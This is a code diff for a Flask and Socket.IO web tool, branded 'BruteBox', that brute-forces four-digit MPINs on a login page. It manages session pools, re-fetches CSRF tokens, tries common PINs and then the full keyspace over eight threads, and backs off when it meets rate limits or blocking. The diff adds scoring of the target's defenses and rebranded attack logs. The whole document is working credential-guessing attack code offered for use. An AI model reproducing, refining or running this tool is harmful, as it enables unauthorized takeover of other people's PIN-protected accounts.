@@ -10,7 +10,6 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your-secret-key-change-in-production'
 socketio = SocketIO(app, cors_allowed_origins="*")
 
-# Store running tasks (keyed by socket session id)
 active_tasks = {}
 
 class WebBruteForcer:
@@ -24,34 +23,44 @@ class WebBruteForcer:
         self.skipped = 0
         self.start_time = time.time()
         self.session_pool = []
-        self.pool_lock = threading.Lock()       # FIX 1: lock for thread-safe pool access
-        self.attempts_lock = threading.Lock()   # FIX 2: lock for thread-safe attempt counter
+        self.pool_lock = threading.Lock()
+        self.attempts_lock = threading.Lock()
+        # Security tracking
+        self.rate_limit_hits = 0
+        self.block_hits = 0
+        self.csrf_rotations = 0
+        self.response_times = []
+        self.last_csrf = None
 
     def emit_progress(self, event, data):
         socketio.emit(event, data, room=self.sid)
 
     def create_session_pool(self, size=10):
-        self.emit_progress('log', {'message': '🔄 Creating session pool...'})
+        self.emit_progress('log', {'message': '[INIT] Spawning session pool...', 'type': 'info'})
         for _ in range(size):
             if self.stop_event.is_set():
                 return False
             session_data = self._new_session()
             if session_data:
                 self.session_pool.append(session_data)
-        self.emit_progress('log', {'message': f'✅ Created {len(self.session_pool)} sessions'})
+        self.emit_progress('log', {'message': f'[POOL] {len(self.session_pool)} sessions active', 'type': 'info'})
         return len(self.session_pool) > 0
 
     def _new_session(self):
-        """Create a fresh session and fetch CSRF token."""
         try:
             session = requests.Session()
             resp = session.get(self.url, timeout=8)
             soup = BeautifulSoup(resp.text, "html.parser")
             csrf_element = soup.find("input", {"name": "_token"})
             if csrf_element:
+                token = csrf_element["value"]
+                # Track CSRF rotation
+                if self.last_csrf and self.last_csrf != token:
+                    self.csrf_rotations += 1
+                self.last_csrf = token
                 return {
                     'session': session,
-                    'csrf_token': csrf_element["value"],
+                    'csrf_token': token,
                     'last_used': time.time()
                 }
         except Exception:
@@ -59,13 +68,11 @@ class WebBruteForcer:
         return None
 
     def get_session_from_pool(self):
-        # FIX 3: thread-safe pool access with lock
         with self.pool_lock:
             if self.session_pool:
                 session_data = self.session_pool.pop(0)
                 session_data['last_used'] = time.time()
                 return session_data
-        # Pool was empty — create a fresh session outside the lock
         return self._new_session()
 
     def return_session_to_pool(self, session_data):
@@ -73,13 +80,52 @@ class WebBruteForcer:
             with self.pool_lock:
                 self.session_pool.append(session_data)
 
+    def get_security_rating(self):
+        score = 0
+        signals = []
+
+        if self.rate_limit_hits > 0:
+            score += 2
+            signals.append(f'Rate limiting detected ({self.rate_limit_hits}x)')
+        if self.block_hits > 0:
+            score += 3
+            signals.append(f'IP/account blocking detected ({self.block_hits}x)')
+        if self.csrf_rotations > 5:
+            score += 2
+            signals.append(f'CSRF token rotation active ({self.csrf_rotations}x)')
+        elif self.csrf_rotations > 0:
+            score += 1
+            signals.append(f'Basic CSRF protection present')
+
+        avg_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
+        if avg_time > 2.0:
+            score += 2
+            signals.append(f'Intentional response delay (~{avg_time:.1f}s avg)')
+        elif avg_time > 1.0:
+            score += 1
+            signals.append(f'Moderate response time (~{avg_time:.1f}s avg)')
+
+        if score >= 6:
+            rating = 'FORTRESS'
+            color = 'fortress'
+        elif score >= 4:
+            rating = 'STRONG'
+            color = 'strong'
+        elif score >= 2:
+            rating = 'MODERATE'
+            color = 'moderate'
+        else:
+            rating = 'WEAK'
+            color = 'weak'
+
+        return {'rating': rating, 'color': color, 'signals': signals, 'score': score}
+
     def try_mpin(self, mpin):
         if self.found or self.stop_event.is_set():
             return None
 
         mpin_str = str(mpin).zfill(4)
 
-        # FIX 4: retry up to 3 times if session fetch fails
         session_data = None
         for attempt in range(3):
             session_data = self.get_session_from_pool()
@@ -88,10 +134,9 @@ class WebBruteForcer:
             time.sleep(0.3)
 
         if not session_data:
-            # Still no session — track as skipped, don't silently drop
             with self.attempts_lock:
                 self.skipped += 1
-            self.emit_progress('log', {'message': f'⚠️ Skipped PIN {mpin_str} (no session available)'})
+            self.emit_progress('log', {'message': f'[WARN] Skipped PIN {mpin_str} — no session', 'type': 'warn'})
             return None
 
         try:
@@ -101,9 +146,11 @@ class WebBruteForcer:
                 "_token": session_data['csrf_token']
             }
 
+            t_start = time.time()
             response = session_data['session'].post(self.url, data=data, timeout=8)
+            elapsed_req = time.time() - t_start
+            self.response_times.append(elapsed_req)
 
-            # FIX 5: thread-safe attempt counter
             with self.attempts_lock:
                 self.attempts += 1
                 current_attempts = self.attempts
@@ -123,20 +170,22 @@ class WebBruteForcer:
                     self.found = True
                     return mpin_str
                 elif "blocked" in str(json_response).lower() or "limit" in str(json_response).lower():
-                    self.emit_progress('log', {'message': f'⚠️ Possible blocking: {json_response}'})
-                    session_data = None  # discard this session
+                    self.block_hits += 1
+                    self.emit_progress('log', {'message': f'[BLOCK] Defense triggered: {json_response}', 'type': 'warn'})
+                    session_data = None
                     time.sleep(2)
             except Exception:
                 if response.status_code == 302:
                     self.found = True
                     return mpin_str
                 elif response.status_code == 429:
-                    self.emit_progress('log', {'message': '⚠️ Rate limited – slowing down...'})
-                    session_data = None  # discard rate-limited session
+                    self.rate_limit_hits += 1
+                    self.emit_progress('log', {'message': '[RATE] Rate limit hit — throttling...', 'type': 'warn'})
+                    session_data = None
                     time.sleep(3)
 
         except Exception:
-            session_data = None  # discard broken session
+            session_data = None
         finally:
             if session_data and not self.found and not self.stop_event.is_set():
                 self.return_session_to_pool(session_data)
@@ -155,87 +204,96 @@ class WebBruteForcer:
             self.emit_progress('error', {'message': 'Failed to create session pool. Check the URL.'})
             return
 
-        self.emit_progress('log', {'message': '🚀 Starting brute force...'})
-        self.emit_progress('log', {'message': '🔍 Testing 40 common PINs first...'})
+        self.emit_progress('log', {'message': '[INIT] BruteBox engine online', 'type': 'info'})
+        self.emit_progress('log', {'message': '[SCAN] Loading common PIN dictionary...', 'type': 'info'})
 
         for i, mpin in enumerate(common_pins):
             if self.stop_event.is_set():
-                self.emit_progress('log', {'message': '⛔ Stopped by user.'})
+                self.emit_progress('log', {'message': '[HALT] Operator abort received.', 'type': 'warn'})
                 return
             result = self.try_mpin(mpin)
             if result:
+                security = self.get_security_rating()
                 elapsed = time.time() - self.start_time
                 self.emit_progress('success', {
                     'mpin': result,
                     'attempts': self.attempts,
-                    'elapsed': round(elapsed, 1)
+                    'elapsed': round(elapsed, 1),
+                    'security': security
                 })
                 return
             if (i + 1) % 10 == 0:
-                self.emit_progress('log', {'message': f'   Tested {i+1}/40 common PINs'})
+                self.emit_progress('log', {'message': f'[SCAN] Dictionary {i+1}/40 tested', 'type': 'info'})
 
-        self.emit_progress('log', {'message': '❌ Not in common PINs. Starting full range...'})
+        self.emit_progress('log', {'message': '[SCAN] Dictionary exhausted. Switching to full keyspace...', 'type': 'info'})
 
         all_mpins = [mpin for mpin in range(10000) if mpin not in common_pins]
         skipped_pins = []
         chunk_size = 100
-
         chunks = [all_mpins[i:i+chunk_size] for i in range(0, len(all_mpins), chunk_size)]
 
         for chunk_idx, chunk in enumerate(chunks):
             if self.stop_event.is_set() or self.found:
                 break
 
-            # Progress log every 10 chunks (~1000 PINs)
             if chunk_idx % 10 == 0:
+                pct = int((chunk_idx / len(chunks)) * 100)
+                bar = '█' * (pct // 5) + '░' * (20 - pct // 5)
                 self.emit_progress('log', {
-                    'message': f'🔢 Testing PINs {chunk[0]:04d}–{chunk[-1]:04d}...'
+                    'message': f'[SCAN] {chunk[0]:04d}–{chunk[-1]:04d} |{bar}| {pct}%',
+                    'type': 'scan'
                 })
 
             with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
                 futures = {executor.submit(self.try_mpin, mpin): mpin for mpin in chunk}
-                for future in concurrent.futures.as_completed(futures, timeout=30):  # FIX 6: chunk timeout
+                for future in concurrent.futures.as_completed(futures, timeout=30):
                     if self.stop_event.is_set() or self.found:
                         executor.shutdown(wait=False)
                         break
                     try:
-                        result = future.result(timeout=10)  # FIX 7: per-future timeout
+                        result = future.result(timeout=10)
                         if result:
+                            security = self.get_security_rating()
                             elapsed = time.time() - self.start_time
                             self.emit_progress('success', {
                                 'mpin': result,
                                 'attempts': self.attempts,
-                                'elapsed': round(elapsed, 1)
+                                'elapsed': round(elapsed, 1),
+                                'security': security
                             })
                             return
                     except concurrent.futures.TimeoutError:
                         original_mpin = futures[future]
                         skipped_pins.append(original_mpin)
-                        self.emit_progress('log', {'message': f'⏱️ Timeout on PIN {original_mpin:04d}, will retry'})
+                        self.emit_progress('log', {'message': f'[TIMEOUT] PIN {original_mpin:04d} queued for retry', 'type': 'warn'})
                     except Exception:
                         pass
 
-        # FIX 8: retry any skipped PINs at the end
         if skipped_pins and not self.stop_event.is_set() and not self.found:
-            self.emit_progress('log', {'message': f'🔁 Retrying {len(skipped_pins)} skipped PINs...'})
+            self.emit_progress('log', {'message': f'[RETRY] Re-testing {len(skipped_pins)} flagged PINs...', 'type': 'info'})
             for mpin in skipped_pins:
                 if self.stop_event.is_set() or self.found:
                     break
                 result = self.try_mpin(mpin)
                 if result:
+                    security = self.get_security_rating()
                     elapsed = time.time() - self.start_time
                     self.emit_progress('success', {
                         'mpin': result,
                         'attempts': self.attempts,
-                        'elapsed': round(elapsed, 1)
+                        'elapsed': round(elapsed, 1),
+                        'security': security
                     })
                     return
 
+        security = self.get_security_rating()
         total_time = time.time() - self.start_time
         self.emit_progress('fail', {
             'attempts': self.attempts,
-            'elapsed': round(total_time, 1)
+            'elapsed': round(total_time, 1),
+            'security': security
         })
+
 
 # ---------- Socket.IO event handlers ----------
 @socketio.on('connect')
@@ -276,16 +334,16 @@ def handle_start(data):
     thread.daemon = True
     thread.start()
 
-    emit('log', {'message': 'Brute force started...'})
+    emit('log', {'message': '[INIT] BruteBox engaged...', 'type': 'info'})
 
 @socketio.on('stop_bruteforce')
 def handle_stop():
     sid = request.sid
     if sid in active_tasks:
         active_tasks[sid].set()
-        emit('log', {'message': 'Stop signal sent.'})
+        emit('log', {'message': '[HALT] Stop signal received.', 'type': 'warn'})
     else:
-        emit('log', {'message': 'No active task to stop.'})
+        emit('log', {'message': '[WARN] No active operation.', 'type': 'warn'})
 
 @app.route('/')
 def index():
